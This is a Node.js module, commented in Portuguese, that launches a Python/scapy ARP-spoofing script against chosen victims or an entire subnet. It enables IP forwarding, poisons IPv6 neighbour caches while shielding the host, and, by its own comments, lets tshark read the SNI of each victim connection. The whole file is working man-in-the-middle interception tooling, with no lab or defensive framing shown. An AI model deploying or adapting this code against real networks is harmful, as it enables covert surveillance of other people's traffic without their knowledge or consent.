'use strict';

const { spawn, execFileSync } = require('node:child_process');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

// Caminho do Python real (o stub da Microsoft Store não serve).
const PYTHON_CANDIDATES = [
  path.join(os.homedir(), 'AppData', 'Local', 'Programs', 'Python', 'Python312', 'python.exe'),
  path.join(os.homedir(), 'AppData', 'Local', 'Programs', 'Python', 'Python313', 'python.exe'),
  path.join(os.homedir(), 'AppData', 'Local', 'Programs', 'Python', 'Python311', 'python.exe'),
];

function pythonPath() {
  for (const p of PYTHON_CANDIDATES) if (fs.existsSync(p)) return p;
  // Procura qualquer PythonXXX em Programs\Python.
  try {
    const base = path.join(os.homedir(), 'AppData', 'Local', 'Programs', 'Python');
    for (const dir of fs.readdirSync(base)) {
      const exe = path.join(base, dir, 'python.exe');
      if (fs.existsSync(exe)) return exe;
    }
  } catch {
    // ignorar
  }
  return 'python'; // última tentativa (pode ser o stub)
}

const SPOOF_SCRIPT = path.join(__dirname, '..', '..', 'scripts', 'arp_spoof.py');

/** Liga o IP forwarding (v4 e v6) para o alvo não perder internet. */
function enableIpForwarding() {
  try {
    execFileSync(
      'powershell',
      ['-NoProfile', '-Command', 'Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue'],
      { windowsHide: true, timeout: 10000 }
    );
    return true;
  } catch {
    return false;
  }
}

/**
 * Protege o cache de vizinhos IPv6 DESTE PC, fixando o gateway v6 (ex.: fe80::1)
 * no MAC real — assim o NA multicast que enviamos não envenena o próprio PC.
 */
function protectSelfNeighbor6(iface, gw6, realMac) {
  if (!iface || !gw6 || !realMac) return;
  try {
    execFileSync(
      'netsh',
      ['interface', 'ipv6', 'set', 'neighbors', iface, gw6, realMac.replace(/:/g, '-')],
      { windowsHide: true, timeout: 10000, stdio: 'ignore' }
    );
  } catch {
    // Não crítico: sem admin ou interface diferente apenas não protege.
  }
}

/** MAC da placa cujo IPv4 está na mesma sub-rede /24 do gateway. */
function localMacForGateway(gatewayIp) {
  const prefix = gatewayIp.split('.').slice(0, 3).join('.') + '.';
  try {
    for (const addrs of Object.values(os.networkInterfaces())) {
      for (const a of addrs) {
        if (a.family === 'IPv4' && !a.internal && a.address.startsWith(prefix) && a.mac) {
          return a.mac.toLowerCase();
        }
      }
    }
  } catch {
    // ignorar
  }
  return null;
}

/** Descobre o MAC atual do gateway IPv6 no cache de vizinhos (para proteção). */
function gateway6Mac(gw6) {
  // Primeiro faz um ping para garantir que o vizinho esteja resolvido (senão a
  // entrada pode vir "incompleta" com MAC 00-00-00-00-00-00).
  const cmd =
    `ping -n 1 -w 1000 ${gw6} | Out-Null;` +
    `Get-NetNeighbor -AddressFamily IPv6 -IPAddress '${gw6}' -ErrorAction SilentlyContinue |` +
    `Where-Object { $_.LinkLayerAddress -and $_.LinkLayerAddress -ne '00-00-00-00-00-00' } |` +
    `Select-Object -First 1 -ExpandProperty LinkLayerAddress`;
  try {
    const out = execFileSync('powershell', ['-NoProfile', '-Command', cmd], {
      encoding: 'utf8',
      windowsHide: true,
      timeout: 10000,
    }).trim();
    if (!out || out === '00-00-00-00-00-00') return null;
    return out;
  } catch {
    return null;
  }
}

/**
 * ARP spoofing via script Python+scapy (usa o Npcap já instalado).
 *
 * O script envia pacotes ARP forjados continuamente, fazendo o alvo mandar
 * o tráfego por este PC. O tshark então lê o SNI de cada conexão.
 */
class ArpSpoofing {
  /**
   * @param {string} gatewayIp  - IP do roteador real
   * @param {string[]|'all'} victims - IPs dos alvos, ou 'all' para varrer a sub-rede
   * @param {Function} onStatus - callback(kind, parts[]) com status do script
   * @param {Function} onError  - callback(Error)
   */
  constructor(gatewayIp, victims, onStatus, onError, options = {}) {
    this.gatewayIp = gatewayIp;
    this.victims = victims;
    this.onStatus = onStatus || (() => {});
    this.onError = onError || (() => {});
    this.gw6 = options.gw6 || null; // gateway IPv6 (ex.: fe80::1)
    this.iface = options.iface || null; // nome da interface (ex.: Wi-Fi)
    this.process = null;
    this.stopped = false;
    this.buffer = '';
  }

  start() {
    if (!fs.existsSync(SPOOF_SCRIPT)) {
      this.onError(new Error(`Script de ARP não encontrado: ${SPOOF_SCRIPT}`));
      return false;
    }

    enableIpForwarding();

    // IPv6: protege o próprio PC e prepara os MACs para o NDP.
    let gw6Mac = null;
    const ourMac = localMacForGateway(this.gatewayIp);
    if (this.gw6) {
      gw6Mac = gateway6Mac(this.gw6);
      if (gw6Mac) protectSelfNeighbor6(this.iface, this.gw6, gw6Mac);
    }

    const victimsArg = this.victims === 'all' ? 'all' : this.victims.join(',');
    const spoofArgs = [SPOOF_SCRIPT, '--gateway', this.gatewayIp, '--victims', victimsArg];
    if (this.gw6) {
      spoofArgs.push('--gw6', this.gw6);
      if (gw6Mac) spoofArgs.push('--gw6-mac', gw6Mac);
    }
    if (ourMac) spoofArgs.push('--our-mac', ourMac);
    if (this.iface) spoofArgs.push('--iface', this.iface);

    const py = pythonPath();
    // stdin fica aberto (pipe) para pedir parada educada no encerramento.
    this.process = spawn(py, spoofArgs, { stdio: ['pipe', 'pipe', 'pipe'], windowsHide: true });
    this.process.stdin.on('error', () => {});

    this.process.stdout.on('data', (chunk) => {
      this.buffer += chunk.toString('utf8');
      const lines = this.buffer.split('\n');
      this.buffer = lines.pop() || '';
      for (const line of lines) this._handleLine(line.trim());
    });

    let stderr = '';
    this.process.stderr.on('data', (c) => (stderr += c.toString('utf8')));
    this.process.on('error', (err) =>
      this.onError(new Error(`Falha ao iniciar o Python: ${err.message}`))
    );
    this.process.on('exit', (code) => {
      if (this.stopped) return;
      const tail = stderr.trim().split('\n').pop() || '';
      this.onError(new Error(`ARP spoofing encerrou (código ${code}). ${tail}`));
    });

    return true;
  }

  _handleLine(line) {
    if (!line) return;
    const [kind, ...parts] = line.split('|');
    if (kind === 'ERROR') {
      this.onError(new Error(parts.join(' ') || 'erro no ARP spoofing'));
    } else {
      this.onStatus(kind, parts);
    }
  }

  stop() {
    this.stopped = true;
    const proc = this.process;
    this.process = null;
    if (!proc) return Promise.resolve();
    return new Promise((resolve) => {
      let done = false;
      const finish = () => { if (done) return; done = true; clearTimeout(timer); resolve(); };
      proc.on('exit', finish);
      // Pede parada educada: o script lê o stdin, para o loop e RESTAURA o ARP
      // antes de sair (no Windows, matar o processo pularia essa restauração).
      try { proc.stdin.write('stop\n'); } catch {}
      try { proc.stdin.end(); } catch {}
      // Dá tempo para a restauração do ARP concluir; se demorar, força o fim.
      const timer = setTimeout(() => {
        try { proc.kill(); } catch {}
        finish();
      }, 3000);
    });
  }
}

module.exports = {
  ArpSpoofing,
  pythonPath,
  enableIpForwarding,
  localMacForGateway,
  gateway6Mac,
};
